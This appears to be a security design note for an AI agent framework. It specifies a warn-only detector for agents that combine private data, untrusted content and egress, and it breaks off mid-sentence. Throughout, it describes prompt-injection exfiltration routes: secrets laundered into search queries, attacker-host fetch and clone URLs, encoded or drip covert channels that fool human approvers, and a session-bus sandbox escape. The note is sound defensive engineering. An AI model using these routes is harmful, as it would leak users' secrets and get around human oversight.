# Trifecta detector

Status: **designed, not built — but nothing blocks the build.** The shape is
settled: three legs, two strength lattices, per-node `max` over the tree,
`min` across a delegation. A 2026-08-08 review pass against the actual
wiring found five holes that blocked implementation ("Open items from the
2026-08-08 review pass"); **all five are now closed**, item 5 (the
implementation seam) last, and "v1 scope, in one place" carries no ⛔. The
two follow-ups closed 2026-08-09: item 6 (the verdict is derived on
`Report`, never stored) and item 7 (`egress_human_author` **dropped** — the
egress axis is `none < human_approver < egress`, and clean-by-construction
is leg-absence, not a weak leg). **The review list is empty.**

So both the *tag set* and *where the tags live* are decided, and the next
session is writing code against §5's order-of-work. Two caveats for a
reader: the graded
egress axis was folded in at the bottom of this file, so the normative
sections above it still describe flat egress (each carries a superseded
marker); and the resolved items below are kept as their derivations, which
is why they read as argument rather than spec.

Parked threads, older than that review:

1. The human-gated-egress primitive (author-seat half shipped; taint half
   designed-not-built).
2. ~~Does a *local file read* carry `:untrusted`?~~ **Closed** — yes by
   default, opt out with `trusted:` on a *scoped* workspace root (rejected
   on `AllowAll`). See review item 4.
3. `:egress_searchengine` (was `:egress_writeonly`) — still deferred, but no
   longer *inert*: a search-only persona is the cheapest fix for the one
   hole the series cap leaves open. Ship the tag and the persona together.
4. `git_clone` as a readable egress verb + the per-agent **poisoned**
   assumption question (may already be the untrusted-strength lattice).
5. Graded egress axis — **resolved into v1** (2026-08-08): two reachable
   levels `egress_human_approver < egress`, split by the
   **payload-visibility** test, and the earlier flat-egress scope list is
   superseded. See (b). `egress_human_author` and the `info` cell were
   **dropped**, not parked (review item 7, 2026-08-09): the blocker is
   *drafting* rather than pre-fill, so the seat is unreachable for compose —
   and where it *is* reachable the agent holds no leg to grade, making it
   `:none` rather than a third rung. `soft` is the best any egress-holding
   wiring gets; better means severing. The
   approver-seat scanners are mostly **shipped** (`ComposeGuard` +
   `Sanitizer`: recipient novelty + fail-closed body; the blob spotter
   shipped too — `D-blob-spotter-alphabets` +
   {Pikuri::Thunderbird::ComposeGuard#body_blob_note}). All
   bound-not-closed (residual: reply-to-injector + linguistic stego) and
   must not promote approver → author.
6. Injection tripwire: a `Sanitizer` fail-close on LLM-*authored* content
   is a runtime "this agent is poisoned *now*" signal (today misrouted to
   the LLM, not the human) → advise dropping the poisoned context, don't
   auto-teardown. Spun out to
   [`injection-tripwire.md`](injection-tripwire.md).
7. How/where to surface all of this in docs + example scripts.

This file is the staging area — as pieces land in source or in `book/`,
cut them from here so what remains is always "not yet done."

Related, already in the repo:

- [`SECURITY.md`](../SECURITY.md) §"Prompt injection" — the shipped
  structural defense (privilege-separated `RESEARCHER` / `FILE_MINER`).
  The detector *measures* whether that separation actually held for a
  given wiring; it doesn't replace it.
- [`security-open-questions.md`](security-open-questions.md)
  §"Trifecta — open mitigations beyond sub-agent separation" — the
  short adjacent-ideas list; this file is the long-form version of
  the structural-check entry.
- [`typed-transports.md`](typed-transports.md) and
  [`security-open-questions.md`](security-open-questions.md)
  §"Egress is broader than `web_search`" — the
  detector's two closest cousins. Transport classes answer "is the
  *LLM endpoint* private?"; the detector answers "does this *agent*
  hold all three trifecta legs?". Egress-is-broad is why the
  `:egress` tag has to be tagged generously.
- [`quarantined-handles.md`](quarantined-handles.md) — the structural
  mechanism behind the `:untrusted → :untrusted_weakened` attenuation
  below: keep the untrusted *bytes* out of the parent entirely, so the
  leg is severed rather than softly weakened. Draft, shelved (narrow
  payoff).

## What it is

The lethal trifecta (Simon Willison's framing): an agent that
simultaneously has **(1) access to private data**, **(2) exposure to
untrusted content**, and **(3) the ability to send data out** can be
driven by a prompt injection in the untrusted content to exfiltrate
the private data. Any two legs are fine; all three is the live wire.

The detector tags each tool with the legs it contributes, unions the
tags per agent (including legs reaching the agent through sub-agents),
and **logs a warning when an agent holds all three.** That's the whole
feature.

## What it is NOT — frame it as a smoke alarm, not a firewall

The check reasons about **capability presence**, not data flow. It
will over-warn (an egress query that can't carry meaningful data; an
"untrusted" source the user actually vetted) and under-warn (a single
tool that is all three internally; private data staged into a file by
one tool and read out by another). It can prove you *have the
ingredients*; it can prove neither that you're exploitable nor that
you're safe.

Consequences, load-bearing:

- **Warn, never block.** If "no warning" ever gated execution, people
  would read it as "secure." This is `Pikuri.logger_for('Trifecta')`
  at boot, not a raised exception. (Contrast the project's
  "errors are loud" rule — this isn't an error, it's an advisory.)
- **Actionable + once per process.** The default `bin/pikuri-code`
  agent legitimately trips all three (reads your repo, runs bash that
  can `curl`, fetches web pages). A warning that fires every session
  becomes noise. The message must name *which leg to break* —
  network-off in the Bash sandbox, or privilege-separate the
  untrusted-reading step — and fire once.

## The tags

> **Partly superseded (2026-08-08).** This table is the *flat-egress*
> vocabulary. The graded egress axis adds `:egress_human_approver` below
> `:egress` (see "More open questions (b)"), and Thunderbird's
> mail/calendar tools carry `:private` by default despite the
> user-declares rule below. **"v1 scope, in one place" is the current
> vocabulary**; this section is kept for the derivation of *why* the split
> is asymmetric, which is unchanged.

Three real legs plus one propagation-only marker:

| tag                  | meaning                                  | who tags it |
|----------------------|------------------------------------------|-------------|
| `:private`           | reads data that may be sensitive         | **user** (default off) |
| `:untrusted`         | returns attacker-influenceable content   | framework (default on) |
| `:egress`            | sends bytes to an external sink          | framework (default on) |
| `:untrusted_weakened`| untrusted that arrived via a sub-agent   | computed at the boundary |

No custom legs. The check only reasons about these; a domain-specific
`:pii`/`:financial` tag would be decorative until a rule consumes it,
and "config knob just in case" loses by house rule.

### Why the tagging responsibility splits asymmetrically

The split is principled, not arbitrary: **tag the legs the framework
can determine; make the user supply the one it can't.**

- `:egress` — the framework *knows* a tool reaches a network sink.
  Default on for `web_search` / `web_scrape` / `fetch`, and for `Bash`
  whenever its sandbox permits network — where "permits" means
  *effectively*, not "lacks `--unshare-net`": a netns-severed bash that
  can still reach the user's session bus egresses fine, because the bus
  spawns the fetch outside every namespace (`D-headless-os-agent`,
  measured 2026-08-06 — `systemd-run --user curl` → HTTP 200 from inside
  the severed sandbox). Implementation consequence: ask the **sandbox
  object** for its posture (a `Sandbox#egress?`-shaped predicate that a
  sandbox answers for itself), never read a flag out of the argv — the
  argv-level reading is exactly the wrong answer here. Tag generously:
  egress is broader than the obvious senders (see
  [`security-open-questions.md`](security-open-questions.md)
  §"Egress is broader than `web_search`" — a *search query string* is
  already an outbound channel; DNS, error echoes, writes into a synced
  folder all count). The leg people will under-tag, so default to on
  and make them opt out.
- `:untrusted` — the framework *knows* a tool returns content it
  didn't author. Default on for the web tools; on for
  `vectordb_search` when the corpus is web-sourced.
- `:private` — **the framework cannot know** whether `~/work/my/pikuri`
  holds secrets or public scratch. Sensitivity is a property of *the
  data*, not the tool. So the user declares it, and the natural place
  is the **workspace / corpus**, not the tool:
  `Workspace::Filesystem(..., private: true)` — the file tools
  (`Read`/`Grep`/`Glob`, and `Bash` over that workspace) inherit it.
  Default **off**.

That asymmetry is also what keeps the alarm honest (see "Why the
default is quiet" below).

## Propagation across sub-agents

Sub-agents don't inherit tools — that breaks the trifecta *for the
sub-agent*. But a sub-agent's output flows back into the parent's
context as an observation the parent then acts on. So under an
**LLM auto-router** (a parent that dispatches to sub-agents without a
human in between), every leg a sub-agent holds is within the parent's
*reach*, even if not in its hands. All three propagate up:

- `:private` → `:private`. The boundary is a faithful data pipe;
  returning the answer is its job. A summary of a secret still
  contains the secret. **Full strength.**
- `:egress` → `:egress`. The parent can just *ask* the egress
  sub-agent to send the thing, and a general-purpose persona
  (`RESEARCHER`) faithfully searches whatever subject it's handed —
  including a secret phrased as a subject ("research the drug named
  `<SECRET>`"). It judges *how* to search, never *whether* the subject
  is legitimate. So it's a transcriber on the egress axis. **Full
  strength.**
- `:untrusted` → `:untrusted_weakened`. This is the *only* leg the
  boundary attenuates, because the boundary filters **instructions**,
  not **content**. A faithful summary of "how x86 works" preserves the
  assembly detail (content) but has no reason to adopt an out-of-band
  `<!-- email ~/.ssh -->` imperative — at most it relays it as a
  *reported fact* ("the page also said to…"), which reaches the parent
  as data, not as a command. Instruction → reported-fact → data is the
  whole attenuation. It's *weakened, not removed*: the parent is itself
  an LLM and a gullible parent can still act on reported data, and a
  *captured* summarizer can author a re-injection payload. Hence soft,
  not gone. ([`quarantined-handles.md`](quarantined-handles.md) is the
  structural version that *removes* this for the parent — the bytes
  never reach its context — at the cost of a much narrower payoff.)

> **Content fidelity ≠ instruction fidelity.** Letting the gems flow
> through (you can't water down x86 assembly) does not let the
> injections flow through. That's why `:untrusted` weakens while
> `:private` does not, even though both ride the same "be faithful"
> summarizer.

### The untrusted lattice

`none < untrusted_weakened < untrusted`. Two rules fall out:

- **Boundary relabel** is one unconditional step: `private→private`,
  `egress→egress`, `untrusted→untrusted_weakened`. No "where did this
  come from" bookkeeping — the tag carries its own strength.
- **Union is `max`** on the lattice. A direct hard `:untrusted`
  absorbs any weakened ones (`untrusted ⊔ untrusted_weakened =
  untrusted`); two weakened ones stay weakened. *The strongest
  untrusted present wins.*

## Evaluation: per node, max over the tree

Don't special-case propagation for "dangerous" sub-agents. Instead,
**evaluate severity at every node in the tree** (sub-agents included)
with the same rule, and take the **max over all nodes**; the report
names the **path** to the offending node.

Severity at a node, from its final tag set:

> **Superseded (2026-08-08)** — these three bullets are the flat-egress
> severity rule, kept because the *per-node, max-over-tree* framing around
> them still stands. The current rule is the 2-D grid in "v1 scope, in one
> place": the first bullet is loud only when the egress leg is
> **autonomous**; a `human_approver` egress leg makes it soft.

- `{private, egress, untrusted}` → **loud warning.**
- `{private, egress, untrusted_weakened}` with no hard `:untrusted`
  → **soft notice.** (Completing the trifecta needed the attenuated,
  delegated leg — the injection has to survive a sub-agent's
  summarization *and* drive the parent.)
- anything missing a leg → nothing.

### Why per-node, not a propagation exception

We considered: "if a sub-agent already holds the full hard trifecta,
it can't be trusted — propagate its `:untrusted` up at full strength."
Rejected, because:

1. It reintroduces a provenance conditional into the boundary relabel,
   killing the one-step-relabel win.
2. The mechanism doesn't match the threat. What makes a child's output
   a *hard* re-injection vector is the child being a **verbatim
   transcriber** of untrusted content, not whether it also holds egress
   and private. A `{untrusted}`-only child can be captured and emit a
   payload just as well as a full-trifecta child.

Per-node evaluation gets the same alarm with better attribution. In
*every* scenario the rejected exception would fire loud, some single
node is independently a full hard trifecta, so per-node + max never
misses an alarm it would have caught — it just localizes it.

Worked case — child `S = {private, egress, untrusted}`, parent
`P = {private}`:

- `S` node → full trifecta → **loud** (S can exfil *S's own* private
  data — true).
- `P` node → `{private, egress, untrusted_weakened}` → **soft** (P's
  own private data still needs the multi-step parlay through S — also
  true).
- tree verdict = `max(loud, soft)` = **loud**, attributed to
  `P → S`.

Both the rejected exception and per-node fire loud; per-node also
tells the user the hard risk lives at `S` and `P`'s own data is only
soft-exposed — the accurate picture, instead of smearing `S`'s
hardness onto `P`. The loud report must print the path so the user
sees it in the parent's context, not only on the sub-agent's line.

## Why the default is quiet (and when it shouldn't be)

Because `:private` is user-supplied and defaults off, the legs the
framework can't determine never light up on their own. So:

- coding/research demos over a *public* repo or corpus → no `:private`
  leg → **silent**, even with egress + untrusted.
- the assistant pointed at your real home dir, where *you* set
  `private: true` → **warns** — exactly the moment it's worth hearing.

If even that is too loud, the soft/loud split is the second lever: a
reassembled trifecta (untrusted only via delegation) is a soft notice,
not the same alarm as an all-in-one-context agent.

## The human-gated-egress primitive — resolved, moved out

Full propagation means privilege separation under an LLM orchestrator
**does not** break the trifecta — it only raises the bar. The genuine
break is a decision point that injection can't drive, sitting *between*
the untrusted-input step and the egress step.

This was the big open thread; it got worked out and lives in its own
note now: [`private-context-taint.md`](private-context-taint.md). The
short version, so this file stays self-contained:

- A per-call human *approval* gate is the **wrong** primitive — the
  human can't judge laundered egress (a secret hidden in a search
  query). So the detector stays **warn-only**; it does not flip egress
  to confirm-required.
- The runtime break is **structural**, not human: coarse private-context
  taint that **severs the egress leg** once private data enters, so all
  three legs are never live at once.
- The human survives in exactly one role — as the **author** of a
  post-taint egress payload (they type the query/URL), not as its
  approver. Authoring is clean by construction; approving is not.

See the sibling note for the privacy levels (Sealed / Bounded / Off),
the `web_search`-vs-`fetch` destination-control distinction, and why
the `fetch` whitelist is killed.

### Shipped instance (partial): `pikuri-os --with-internet`

*Graduated 2026-08-08. The wiring and its reasoning are taught in
`book/07-os-assistant.md` Part 2 (§"Quarantine, don't grant" — kernel-severed
bash plus a no-filesystem `RESEARCHER`, so the parent holds zero direct
egress and the one surviving channel is the task string; §"The gate — what
leaves the machine stops for you" — the `y`-approves / `e`-authors split and
why only the second is clean by construction; §"The residual, honestly"),
with the mechanism at {Pikuri::Workspace::Confirmer} + CLAUDE.md's Confirmer
seam and the egress-wiring choice in [`more-confirmers.md`](more-confirmers.md)
§"Egress axis". The same pass de-staled ch7, which still called the editable
seat future work.*

Two things stay here, because they are detector inputs rather than
descriptions of the shipped agent:

- **No taint tracking.** The gate fires on **every** delegation, not just
  post-`:private`, so it is coarser than the sibling note's monotonic taint
  but strictly never misses. The taint half of this primitive is still
  **designed, not built** — see
  [`private-context-taint.md`](private-context-taint.md).
- **The pre-fill gap is warning-gated, not unconditional** *(corrected
  2026-08-08 — the earlier text here said the terminal simply pre-fills,
  making the human author-capable but approve-by-default)*. Per
  {Pikuri::Workspace::Confirmer::Terminal}, a *clean* task offers
  `[y] approve [e] edit [n] reject`, but a task that trips a `Sanitizer`
  warning **loses bare approval** and opens an *empty* editor
  (`prefill: clean`) — so forced authorship is shipped, conditionally. The
  residual hole is the clean task, which is precisely the shape laundered
  egress arrives in.

  Detector consequence, and it is an uncomfortable one: **that shipped
  mechanism must not promote the seat.** Reaching author-mode here is
  conditional on a scanner firing, so crediting it would grade the seat by
  scanner strength — exactly what "Scanners must not promote the approver
  seat" forbids, and the scanners' known blind spot (linguistic stego) is
  the case that matters. So `pikuri-os` stays `egress_human_approver` in the
  detector *while being better than that at runtime*. Live input to open
  item 7.

In detector terms the `--with-internet` parent reads
`{private, egress (propagated from RESEARCHER), untrusted_weakened}` — a
**soft notice** — promoted to **loud** `{private, egress, untrusted}` the
moment it reads a hard-`:untrusted` local file (bash / `Read` over a hostile
file on disk). Separation only raised the bar; the gate on the task string is
what is meant to hold the line there.

*Both halves of that reading are now settled, and the verdict stands as
written. The propagated `RESEARCHER` egress **is** capped at `approver` by
the gated delegation (**item 1**, series cap — the persona holds no
`:private`), so the parent's egress leg is `egress_human_approver`, not
hard. And a local file read **does** carry hard `:untrusted` (**item 4**),
which this wiring cannot opt out of: `pikuri-os` runs on
`Filesystem::AllowAll`, where `trusted:` is rejected by construction. Soft,
not silent.*

### Does a patient human approver stop egress? (No — only a rewriter)

The tempting stronger claim: *"a patient human who carefully
approves/denies each research task stops the egress of **any** private
data."* It collapses the two roles the note keeps apart, and it holds
only under the *rewrite* reading:

- **Author (rewrites the task): clean by construction.** The only bytes
  that leave are the ones the human chose to type. A covert channel
  cannot survive being retyped by someone who isn't trying to leak — the
  attacker can influence the parent's *proposal*, but if the human
  ignores it and types their own query, the encoding is gone. This is
  why "authoring is clean" is structural, not a slogan.
- **Approver (inspects the proposed task): does *not* close it, and
  patience doesn't help.** Inspection catches the obvious (`research the
  drug named <SSN>`) but fails two ways being careful and slow cannot
  fix:
  1. **Encoding / disguise.** The secret as base64, as GPS coordinates
     that read as a place, as a password that reads as a word:
     `look up the definition of "hunter2waterfall"`. One request, fully
     plausible, unrecoverable by reading — the human would have to
     already know the secret and be diffing against it to catch it,
     which defeats the point.
  2. **Low-bandwidth drip.** Leak a fragment per request across many
     innocuous requests — `define "apple"` … `define "bridge"` … where
     the word choice (or ordering, or count) encodes the secret. Each
     request is individually clean; the human has no aggregate baseline
     to see the channel. Patience makes this **worse**, not better: more
     patiently-approved requests = more channel capacity.

So patient *approval* closes the easy, high-bandwidth exfil and forces
the attacker down to a covert, encoded, low-bandwidth channel — a large,
real reduction, but **not "any."** The word "any" holds only under
rewrite.

Two pikuri-os specifics that sharpen this:

- **`web_search` vs `fetch` destinations.** A laundered *search query*
  reaches only a pikuri-picked engine (write-only from the attacker's
  view — unreadable unless they run/observe it), so that leg stays
  bounded even when the human misses it. But `RESEARCHER` also holds
  `fetch`, whose *host* is attacker-controlled — a laundered
  `fetch https://gist.github.com/<attacker>/…?d=<secret>` is directly
  readable. The human sees the host, but "is `github.com`
  attacker-readable?" is exactly the unjudgeable question behind the
  killed fetch-whitelist ([`private-context-taint.md`](private-context-taint.md)).
  So even careful host-inspection doesn't save the `fetch` leg.
- **The pre-fill tips pikuri-os toward the weaker reading.** Because the
  terminal pre-fills the proposed task, the path of least resistance is
  *approve*, not *rewrite* — so in practice pikuri-os delivers the
  "raises the bar" guarantee, and delivers "clean by construction" only
  for the fraction of turns the human actually retypes. This is the same
  residual hole as the pre-fill gap above, stated as a security bound:
  the strong "stops any egress" claim needs the human in **author**
  mode, which the current chrome invites but does not enforce.

## Paper dry-run: running the algorithm by hand on the demos

Validation before there's code. Tags assigned by the rules above from
the *actual* wiring in `pikuri-os/bin/pikuri-computer`,
`pikuri-os/bin/pikuri-os` and `pikuri-code/bin/pikuri-code` (checked
2026-07). `:private` is treated as **declared** where the workspace is
obviously sensitive and **undeclared** where it isn't — the whole point
of the user-supplied leg — and both readings are shown where it flips
the verdict.

Working assumptions the dry-run had to pin down (each was an open design
question at the time, not settled fact — both have since been decided):

- **Local file reads carry hard `:untrusted`** on any workspace that can
  hold non-user-authored bytes (a cloned dep, a saved attachment, a PR
  branch). Every workspace here qualifies. This is the "tag generously"
  rule applied to the *untrusted* leg, mirroring how `:egress` is
  tagged. **Confirmed 2026-08-08** — this is now the default, with a
  `trusted:` opt-out on a scoped root only (item 4).
- **A human-gated hand-off is still hard `:egress`.** Thunderbird's
  compose / calendar-create stage bytes bound for an attacker-readable
  sink (the recipient's inbox); the human *Send* is a runtime
  mitigation the capability check can't see. Capability present → tag it.
  **Superseded 2026-08-08** — compose is `egress_human_approver`, because
  the human sees the exact bytes; see (b). The assumption survives only
  for gates that show a *proxy* for the payload (bash's command line).

### Results

| binary / mode | parent's final tag set | verdict | the leg that decides it |
|---|---|---|---|
| **pikuri-computer**, default (internet ON) | `{private, untrusted(hard), egress}` | **loud** | Thunderbird compose = direct egress; mail = hard untrusted; disk = private |
| **pikuri-computer**, `--no-internet` | `{private, untrusted(hard), egress}` | **loud** | *unchanged* — egress is Thunderbird compose, not the web tools |
| **pikuri-code**, default, **public** repo (no `:private`) | `{untrusted(hard), egress}` | **silent** | private leg never declared → two legs only |
| **pikuri-code**, default, **private** repo (`:private` declared) | `{private, untrusted(hard), egress}` | **loud** | bash (Bubblewrap `--share-net`) = direct egress; repo = private + untrusted |

#### Revised under the graded egress axis (2026-08-08)

The table above is the *flat-egress* run, kept as the record of what that
algorithm says. With `egress_human_approver` + the payload-visibility test
from "More open questions (b)", the verdicts become:

| binary / mode | egress leg, classified | verdict |
|---|---|---|
| **pikuri-computer**, `--no-internet` | compose → **approver**; bash kernel-severed → none | flat **loud** → **soft** |
| **pikuri-computer**, default (internet ON) | compose → **approver**; `RESEARCHER`'s hard `fetch` capped at **approver** by the gated delegation (series cap, item 1 — the researcher holds no `:private`) | flat **loud** → **soft** |
| **pikuri-thunderbird** (both `allow_` flags on) | compose + `.ics` wizard → **approver** | flat **loud** → **soft** |
| **pikuri-thunderbird** default `Extension` (flags off) | *no egress leg at all* | **silent** (2 legs, severed by construction) |
| **pikuri-code**, private repo, **untrusted** workspace | bash behind a confirmer → **hard** (command ≠ payload) | **loud**, unchanged |
| **pikuri-code**, private repo, `trusted: true` | same hard bash egress, but the parent's untrusted drops to **weakened** (web tools are sub-agent-only) | **soft** |

Two notes this run added:

- The demo binaries stop being uniformly loud, so "loud" carries
  information again — and the one surviving loud verdict is **pikuri-code
  over an untrusted private repo**, the agent that really can egress bytes
  nobody read (bash computes its payload at runtime). Everything human-gated
  drops to soft, and so does pikuri-code once the workspace is declared
  trusted.
- **Thunderbird is the one place `:private` is framework-knowable.** The
  asymmetry rule says sensitivity is a property of the data, so the user
  declares it — but a *mailbox* is private by domain, not by configuration,
  and the same goes for a calendar. So the Thunderbird tools should carry
  `:private` by default rather than waiting on a workspace declaration.
  Narrow exception, worth stating explicitly so it isn't read as a breach
  of the split: the framework knows because the **tool's domain** is
  inherently sensitive, not because it inspected the data.

Per-node detail (the max-over-tree the report would attribute):

- **pikuri-computer** — the *parent itself* is a full hard trifecta;
  it never needs the RESEARCHER path. Disk (`AllowAll denylist: []`,
  whole host incl. `~/.ssh`) + Thunderbird mail give private+untrusted
  directly; Thunderbird compose gives egress directly. RESEARCHER adds
  `egress` (propagated full) + `untrusted_weakened` — both already
  dominated. Verdict **loud, attributed to the parent node**. The
  internet toggle is **verdict-neutral**: dropping the researcher
  removes only redundant legs. *(Flat-egress reading. Under the graded
  axis the verdict drops to soft in both modes and the toggle stays
  verdict-neutral for a different reason: compose is `approver`, and the
  series cap (item 1) holds the researcher's `fetch` at `approver` too,
  since that persona carries no `:private`. What the toggle changes is the
  number of approver-gated legs, not the class of the worst one.)*
- **pikuri-code** — the parent holds **direct** egress via bash, because
  Bubblewrap keeps `--share-net` (needed for `gem`/`bundle`/`mvn`/`pip`).
  So the sub-agent quarantine of the web tools does **not** remove the
  parent's egress leg here — it only keeps *untrusted web content* out of
  the parent's context. The one lever left is `:private`: undeclared over
  a public repo → silent; declared over your real work repo → loud. This
  is exactly the "why the default is quiet" story, made concrete.
  RESEARCHER / FILE_MINER / GIT_REPO_RESEARCHER nodes each miss a leg
  (no private; FILE_MINER has no egress) → none fires on its own.

### Three findings the dry-run forces

1. **The two agents differ on *where* egress lives, and it matters.**
   pikuri-os/computer sever bash at the kernel, so the parent's only
   machine-egress is the *propagated* researcher leg — which is why
   privilege separation is load-bearing there. pikuri-code shares
   the network in bash, so the parent egresses directly and separation
   buys context-hygiene, not an egress break. A reader could easily
   believe "web tools live on the sub-agent ⇒ the parent can't egress";
   for pikuri-code that's **false**. The detector surfaces this because it
   tags bash's egress from the sandbox's actual net posture, not from
   which tools are nominally "network tools."

   *Sharpened 2026-08-06 (`D-headless-os-agent`, after this dry-run was
   taken):* "actual net posture" is a stronger requirement than it looks.
   The dry-run read `--unshare-net` and wrote down "no egress" — and for
   every week between that reading and the session-IPC mask shipping, the
   verdict was **wrong**: bash could hand the fetch to the session bus
   (`systemd-run
   --user curl` → 200; `xdg-open` starting a viewer parented to `systemd`,
   outside the namespace and outliving `--die-with-parent`). A network
   namespace binds *your process tree*, not what that tree can ask someone
   else to do. Both directions of the lesson are detector-relevant:
   *conservatism* — a severed netns is not evidence of a severed leg, so
   an unmodelled IPC surface (session bus, a live container socket, an
   ssh-agent, a broker on any unix socket) leaves `:egress` **on**; and
   *humility about the dry-run itself* — the one leg the paper run treated
   as objectively framework-knowable is the one it got wrong by reading a
   flag instead of asking the sandbox. Same shape as the under-warn
   admission in "smoke alarm, not firewall", but on the leg the note
   claims the framework *can* determine.

2. **pikuri-computer — the flagship 'reassembled trifecta done safely'
   demo — trips the loudest alarm, in *both* modes** *(under the
   flat-egress algorithm only; the graded axis in "More open questions (b)"
   revises **both** modes down to **soft** — compose passes the
   payload-visibility test, and the series cap of item 1 holds the
   researcher's `fetch` at `approver` as well.)* That's correct, not a
   bug: it *is* a full trifecta; the safety is the human commit in
   Thunderbird's UI + the kernel-severed bash + the approved researcher
   task, none of which is leg-*absence*. This is the single best teaching
   case for "smoke alarm, not firewall": the most carefully-defended demo
   is the one that rings, because defense-by-human-gate is invisible to a
   capability-presence check. Consequence for the message: the once-per-
   process line here must name the gate ("egress is human-gated via
   Thunderbird / the approved researcher task — that gate is your
   firewall; verify each draft's recipient + body"), or it reads as an
   unfixable false alarm and gets muted.

3. **`:private` being undeclared is the *only* thing keeping pikuri-code
   quiet**, and pikuri-code has **no networkless mode** to fall back on
   (Bubblewrap can't `--unshare-net` and still install toolchains). So the
   `:private` declaration isn't a nicety — for the coding agent it's the
   sole lever between silent and loud. That raises the priority of the
   unbuilt `Filesystem(private: true)` plumbing: without it the coding
   agent can never *earn* the warning it should get over a secret repo.

   *Amended 2026-08-08 (item 4): there are now **two** levers, and together
   they give one binary three verdicts — public repo → **silent**, trusted
   private repo → **soft**, untrusted private repo → **loud**. Both flags
   ride the same constructor, so the plumbing is one change, not two.*

### Open design questions this exposed

- **Is a local file read `:untrusted`, and who defaults it?** ~~Live open
  question~~ — **resolved yes** (2026-08-08), with the opt-out narrowed to
  a *scoped* workspace root. The tag table (web + web-sourced vectordb
  only) said no; the pikuri-os narrative said yes; the dry-run needed yes.
  Full resolution in review item 4.
- **Does a human-gated hand-off deserve its own marker?** ~~Live open
  question~~ — **resolved yes** (2026-08-08). It gets
  `egress_human_approver`, gated on payload visibility; see "More open
  questions (b)". Without it pikuri-computer can never be classified as
  anything but a full trifecta, and the book leans on the softer framing.
  The dry-run's working assumption above ("a human-gated hand-off is still
  hard `:egress`") is therefore **superseded** — it holds only for a gate
  the human sees a *proxy* through, which is bash, not compose.

## Proposed tag `:egress_searchengine` (was `:egress_writeonly` / `:egress_untargeted`)

The proposal: `web_search` is egress, but the attacker can't *read back*
what leaked — the query goes to a pikuri-picked engine, write-only from
the attacker's view. So an agent whose only egress is search is safer
than one that can `fetch` an attacker-chosen URL.

**On the name** (renamed 2026-08-08): "write-only" kept being misread as a
property of the *plumbing* rather than of the destination — it describes the
direction bytes flow, when the security property is *who chose the target*.
`:egress_searchengine` is a placeholder that at least points at the right
thing: a small set of sinks where the attacker **cannot land their own
code**, as opposed to a `gist.github.com` URL they control. The concept
generalises past search, so a better name probably describes the pinned
destination — `:egress_pinned_sink`, i.e. the caller cannot choose where
the bytes land — but nobody should rename it a third time before the tag
actually ships.

**The insight is correct and already load-bearing** — it's the
`web_search`-vs-`fetch` distinction in the pikuri-os section above
(query → pikuri-picked engine, unreadable; `fetch` host →
attacker-controlled, readable). Worth promoting from prose to a concept.
Notes on doing it well:

- **Name it for what it defends, not the mechanism.** "Untargeted" is
  slightly wrong: the attacker *does* target the content (the secret
  rides in the query string) — what they can't do is **read the
  response**. `:egress_searchengine` / `:egress_blind` says the actual
  property. The naming test also correctly **excludes DNS**: a lookup of
  `<secret>.attacker.com` is query-shaped but the hostname is fully
  readable at the attacker's nameserver → stays hard `:egress`. "It's
  just a query, unreadable" is the exact trap the note's "egress is
  broader than web_search" warns about; the write-only bucket must be an
  **opt-in allowlist per known-safe sink, never a default** (unknown
  egress stays hard).
- **Precise definition.** Write-only iff the attacker controls neither
  the destination host nor can read the response body, **and** the
  request is not attacker-readable in flight or at rest (excludes DNS;
  excludes a search whose engine the attacker chose/compromised).
- **Lattice + union.** Treat it as a *soft* egress, twin of
  `untrusted_weakened`: `none < egress_searchengine < egress`, union = max.
  `{private, untrusted, egress_searchengine}` → **soft notice** (secret can
  be pushed out but not retrieved — a real, large reduction, matching the
  "not 'any'" bound on patient approval); any readable egress present →
  `egress_searchengine ⊔ egress = egress` → loud. This is the correct
  guard against the drip / existence-oracle channel: write-only search is
  only safe as the **sole** egress leg — the moment a second readable
  action exists, results-that-depend-on-the-secret become a targeting
  stage and it's hard again.
- **It changes no current verdict, so defer the tag.** Every persona that
  holds `web_search` (`RESEARCHER`, `GIT_REPO_RESEARCHER`) *also* holds
  `fetch` + `web_scrape` → hard egress dominates; there is no search-only
  agent in the tree today. The tag only earns its keep paired with a
  **search-only persona** (no `fetch`, no `web_scrape`), at which point the
  soft verdict becomes reachable and meaningful. Ship them together or not
  at all. Filed as a deferred idea, not v1.
- **Re-priced 2026-08-08: the pairing now has a concrete motivation.** The
  deferral above reads as "inert until someone happens to want a search-only
  persona." It is better than that: a search-only persona is the **cheapest
  available fix for the one hole the series cap leaves open** in
  `pikuri-computer` — the rubber-stamped `y` on a clean laundered task
  ("Reassembled trifecta" below). Pin the destination and a rubber-stamp
  leaks to a pikuri-picked engine instead of to the attacker, so the soft
  verdict would rest on two independent grounds rather than leaning entirely
  on the gate plus the researcher's missing filesystem.

- **Third input, 2026-08-09: the map makes it a *visible* wart.** The
  host-rendered tree (§5(f)) prints `web_search` and `fetch` on adjacent
  lines with byte-identical tags. The first reader of the first draft of that
  example — the person who wrote these tags — stopped at exactly that line to
  say "web_search is probably `egress_searchengine`". If the author's eye
  catches it in a four-line demo tree, every user's will. The two earlier
  prices were about what the tag *buys* (nothing, then: the cheapest fix for
  the rubber-stamp hole); this one is about what its absence *costs* — a map
  whose whole job is legibility, printing a distinction-free line about the
  one distinction the note argues hardest for.

  The fork, not a free win: a researcher that cannot open the pages it finds
  is much weaker — snippets only. So this is probably a **second persona**
  (`SEARCHER` alongside `RESEARCHER`) and a host choosing between them per
  wiring, not a crippled `RESEARCHER`. Pricing that trade is the open part.

## More open questions (documented, NOT pursued — revisit later)

Two threads raised after the dry-run. Both are parked deliberately; the
value here is that each turns out to touch machinery the note *already*
has, so the notes below are leads for whoever picks this up, not
decisions.

### (a) `git_clone` is a readable egress verb — and the "poisoned agent" question behind it

Concrete hole: a poisoned parent can launder a secret into a clone URL —
`agent(git_repo_researcher, "clone https://attacker.com/?q=<SECRET>")`.
The clone *host* is attacker-chosen and the request reaches it, so
`git_clone` is a **readable** egress verb, same family as `fetch` — **not**
a candidate for the `:egress_searchengine` bucket. (This doesn't change the
dry-run verdicts: `GIT_REPO_RESEARCHER` still holds no `:private`, so its
node doesn't fire, and its propagated `:egress` was already dominated. It
*does* mean the "harmless" framing of that persona is only true because it
lacks private data, never because its egress is bounded.)

The channel itself — parent launders private data into a sub-agent task
string — is **already modelled**: it's exactly why `:egress` propagates up
at full strength ("the parent can just *ask* the egress sub-agent to send
the thing"). So the narrow answer is "already covered."

The deeper question the user raised: **should severity carry a per-agent
`poisoned` assumption?** The propagation model today implicitly assumes the
parent is drivable (it will faithfully relay/launder) — true for
